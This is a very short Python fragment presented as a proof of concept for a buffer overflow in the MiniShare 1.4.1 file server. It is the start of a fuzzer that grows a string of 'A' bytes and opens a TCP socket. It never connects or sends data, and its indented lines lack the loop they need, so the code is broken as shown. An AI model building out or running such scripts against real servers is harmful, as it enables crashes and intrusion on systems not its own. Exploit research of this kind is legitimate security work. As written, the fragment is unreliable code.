# This is a Proof of concept about BufferOverflow vulnerability in MiniShare 1.4.1

import socket

FUZZ = ""

    FUZZ += "A" * 100
    print("Fuzzing with {} bytes".format(len(FUZZ)))
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
